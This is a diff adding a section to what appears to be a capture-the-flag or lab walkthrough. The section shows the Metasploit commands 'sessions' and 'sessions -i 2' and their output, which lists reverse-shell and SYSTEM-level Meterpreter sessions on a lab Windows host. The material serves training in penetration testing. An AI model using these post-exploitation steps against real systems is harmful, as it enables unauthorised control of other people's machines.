@@ -1096,6 +1096,43 @@ The room's fallback note which says re-run the previous task's exploit if this f
 ==No answer needed==
 <div align="center">
 <br>
+<br>
+</div>
+
+**Commands**
+
+```
+sessions
+sessions -i 2
+```
+
+**Breakdown**
+
+|Component|Purpose|
+|---|---|
+|`sessions`|Lists active sessions. Confirms session 2 opened as Meterpreter and session 1 survived as a fallback.|
+|`sessions -i 2`|Interacts with session 2 by ID, changing the prompt to `meterpreter >`.|
+
+**Result**
+
+```shell
+msf post(multi/manage/shell_to_meterpreter) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                                               Connection
+  --  ----  ----                     -----------                                               ----------
+  1         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.3.9600] -----  192.168.134.39:4444 -> 10.48.162.9:49269 (10.48.162.9)
+  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WIN-JO6REVNMMMP                     192.168.134.39:4433 -> 10.48.162.9:49343 (10.48.162.9)
+
+msf post(multi/manage/shell_to_meterpreter) > sessions -i 2
+[*] Starting interaction with 2...
+
+meterpreter > 
+```
+<div align="center">
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 <br>
